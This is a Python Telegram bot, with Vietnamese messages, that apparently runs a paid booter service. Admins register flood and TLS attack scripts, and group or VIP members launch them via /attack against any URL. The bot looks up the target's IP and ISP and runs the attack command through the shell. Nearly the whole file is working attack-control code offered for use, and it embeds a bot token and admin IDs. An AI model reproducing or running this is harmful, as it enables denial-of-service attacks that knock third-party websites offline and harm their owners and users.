import time
import json
import asyncio
import socket
import requests
from urllib import parse
from datetime import datetime
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler
from pytz import timezone
from html import escape
import os

TOKEN, ADMIN_ID, GROUP_ID, VIP_USERS_FILE, METHODS_FILE, user_processes = '7464694057:AAEXqkeqkEEopZkg4syDSANi8r5pzqQV2IY', 5582437613, -1002365124072, 'vip_users.json', 'methods.json', {}

def load_json(file): 
    return json.load(open(file, 'r')) if os.path.exists(file) else (save_json(file, {}) or {})
def save_json(file, data): 
    json.dump(data, open(file, 'w'), indent=4)
def get_vietnam_time(): 
    return datetime.now(timezone('Asia/Ho_Chi_Minh')).strftime('%Y-%m-%d %H:%M:%S')
def get_ip_and_isp(url): 
    try: 
        ip = socket.gethostbyname(parse.urlsplit(url).netloc)
        response = requests.get(f"http://ip-api.com/json/{ip}")
    except: 
        return None, None
    return ip, response.json() if response.ok else None

async def pkill_handler(update, context): 
    if update.message.from_user.id != ADMIN_ID: 
        return await update.message.reply_text("Bạn không có quyền truy cập.")
    pkill_commands = ["pkill -9 -f flood", "pkill -9 -f tlskill", "pkill -9 -f bypass", "pkill -9 -f killer"]
    for cmd in pkill_commands:
        process = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        stdout, stderr = await process.communicate()
        if stderr: 
            return await update.message.reply_text("Đã xảy ra lỗi.")
    await update.message.reply_text("KILL [FLOOD] [TLS] [BYPASS] [KILLER] THÀNH CÔNG")

async def command_handler(update, context, handler_func, min_args, help_text): 
    if len(context.args) < min_args: 
        return await update.message.reply_text(help_text)
    await handler_func(update, context)

async def add_method(update, context, methods_data):
    if update.message.from_user.id != ADMIN_ID: 
        return await update.message.reply_text("Bạn không có quyền truy cập.")
    if len(context.args) < 2: 
        return await update.message.reply_text("Cách sử dụng: /add <method_name> <url> timeset <time> [vip/member]")
    method_name, url, attack_time = context.args[0], context.args[1], 60
    if 'timeset' in context.args: 
        try: 
            attack_time = int(context.args[context.args.index('timeset') + 1])
        except: 
            return await update.message.reply_text("Tham số thời gian không hợp lệ.")
    visibility = 'VIP' if '[vip]' in context.args else 'MEMBER'
    command = f"node --max-old-space-size=32768 {method_name} {url} " + " ".join([arg for arg in context.args[2:] if arg not in ['[vip]', '[member]', 'timeset']])
    methods_data[method_name] = {'command': command, 'url': url, 'time': attack_time, 'visibility': visibility}
    save_json(METHODS_FILE, methods_data)
    await update.message.reply_text(f"Phương thức {method_name} đã được thêm dưới dạng {visibility}.")

async def delete_method(update, context, methods_data):
    if update.message.from_user.id != ADMIN_ID: 
        return await update.message.reply_text("Bạn không có quyền truy cập.")
    if len(context.args) < 1: 
        return await update.message.reply_text("Cách sử dụng: /del <method_name>")
    method_name = context.args[0]
    if method_name not in methods_data: 
        return await update.message.reply_text(f"Không tìm thấy phương thức {method_name}.")
    del methods_data[method_name]
    save_json(METHODS_FILE, methods_data)
    await update.message.reply_text(f"Phương thức {method_name} đã bị xóa.")

async def attack_method(update, context, methods_data, vip_users): 
    user_id, chat_id = update.message.from_user.id, update.message.chat.id
    if chat_id != GROUP_ID: 
        return await update.message.reply_text("Bạn không có quyền sử dụng. BUY KeyVIP Connact 👉 [@yeuem111233] [@jonhhaha] 🛡️")
    if user_id in user_processes and user_processes[user_id].returncode is None: 
        return await update.message.reply_text("Attacker 🚀 đang diễn ra.")
    if len(context.args) < 2: 
        return await update.message.reply_text("Cách sử dụng: /attack tlskill https://trangwebcuaban.com")
    method_name, url = context.args[0], context.args[1]
    if method_name not in methods_data: 
        return await update.message.reply_text("Không tìm thấy phương thức.")
    method = methods_data[method_name]
    if method['visibility'] == 'VIP' and user_id != ADMIN_ID and user_id not in vip_users: 
        return await update.message.reply_text("Phương thức VIP.")
    attack_time = method['time']
    if user_id == ADMIN_ID and len(context.args) > 2: 
        try: 
            attack_time = int(context.args[2])
        except: 
            return await update.message.reply_text("Thời gian không hợp lệ.")
    ip, isp_info = get_ip_and_isp(url)
    if not ip: 
        return await update.message.reply_text("Không thể lấy địa chỉ IP.")
    command = method['command'].replace(method['url'], url).replace(str(method['time']), str(attack_time))
    isp_info_text = json.dumps(isp_info, indent=2, ensure_ascii=False) if isp_info else 'Không có thông tin ISP.'
    username, start_time = update.message.from_user.username or update.message.from_user.full_name, time.time()
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔍 Kiểm tra trạng thái website", url=f"https://check-host.net/check-http?host={url}")]])
    await update.message.reply_text(f"Attacker 🚀 {method_name} bởi @{username}.\nISP:\n<pre>{escape(isp_info_text)}</pre>\nThời gian: {attack_time}s\nBắt đầu: {get_vietnam_time()}", parse_mode='HTML', reply_markup=keyboard)
    asyncio.create_task(execute_attack(command, update, method_name, start_time, attack_time))

async def execute_attack(command, update, method_name, start_time, attack_time):
    try:
        process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        user_processes[update.message.from_user.id] = process
        stdout, stderr = await process.communicate()
        end_time = time.time()
        attack_status, error_message = "thành công" if not stderr else "thất bại", stderr.decode() if stderr else None
    except Exception as e:
        end_time, attack_status, error_message = time.time(), "thất bại", str(e)
    elapsed_time = round(end_time - start_time, 2)
    attack_info = {"method_name": method_name, "username": update.message.from_user.username or update.message.from_user.full_name, 
                   "start_time": get_vietnam_time(), "end_time": get_vietnam_time(), "elapsed_time": elapsed_time, "attack_status": attack_status, "error": error_message or "Không"}
    safe_attack_info_text = escape(json.dumps(attack_info, indent=2, ensure_ascii=False))
    await update.message.reply_text(f"Attacker 🚀 hoàn tất! Thời gian: {elapsed_time}s.\n\nChi tiết:\n<pre>{safe_attack_info_text}</pre>", parse_mode='HTML')

async def list_methods(update, methods_data):
    if not methods_data: 
        return await update.message.reply_text("Không có phương thức nào.")
    methods_list = "\n".join([f"{name} ({data['visibility']}): {data['time']}s" for name, data in methods_data.items()])
    await update.message.reply_text(f"Danh sách phương thức:\n{methods_list}")

async def manage_vip_user(update, context, vip_users, action):
    if update.message.from_user.id != ADMIN_ID: 
        return await update.message.reply_text("Bạn không có quyền truy cập.")
    if len(context.args) < 1: 
        return await update.message.reply_text("Cách sử dụng: /vipuser <uid> để thêm hoặc /delvip <uid> để xóa")
    user_id = int(context.args[0])
    if action == "add":
        if user_id in vip_users: 
            return await update.message.reply_text(f"Người dùng {user_id} đã là VIP.")
        vip_users.add(user_id)
        save_json(VIP_USERS_FILE, list(vip_users))
        await update.message.reply_text(f"Người dùng {user_id} đã được thêm vào VIP.")
    elif action == "remove":
        if user_id not in vip_users: 
            return await update.message.reply_text(f"Người dùng {user_id} không phải là VIP.")
        vip_users.remove(user_id)
        save_json(VIP_USERS_FILE, list(vip_users))
        await update.message.reply_text(f"Người dùng {user_id} đã bị xóa khỏi VIP.")
    
async def help_message(update, context):
    await update.message.reply_text(
    "Owners: @yeuem111233 | @jonhhaha\n"
    "🇻🇳 /attack tlskill https://trangwebcuaban.com 🚀.\n"
    "🇻🇳 /methods: Liệt kê tất cả các phương thức hiện có 🚀."
)

def main():
    methods_data, vip_users = load_json(METHODS_FILE), set(load_json(VIP_USERS_FILE))
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("add", lambda u, c: command_handler(u, c, lambda u, c: add_method(u, c, methods_data), 2, "Cú pháp không hợp lệ.")))
    app.add_handler(CommandHandler("del", lambda u, c: command_handler(u, c, lambda u, c: delete_method(u, c, methods_data), 1, "Cú pháp không hợp lệ.")))
    app.add_handler(CommandHandler("attack", lambda u, c: command_handler(u, c, lambda u, c: attack_method(u, c, methods_data, vip_users), 2, "Nhập đúng cú pháp: /attack tlskill https://trangwebcuaban.com")))
    app.add_handler(CommandHandler("methods", lambda u, c: list_methods(u, methods_data)))
    app.add_handler(CommandHandler("vipuser", lambda u, c: manage_vip_user(u, c, vip_users, "add")))
    app.add_handler(CommandHandler("delvip", lambda u, c: manage_vip_user(u, c, vip_users, "remove")))
    app.add_handler(CommandHandler("pkill", pkill_handler))
    app.add_handler(CommandHandler("help", help_message))
    app.run_polling()

if __name__ == "__main__": 
    main()
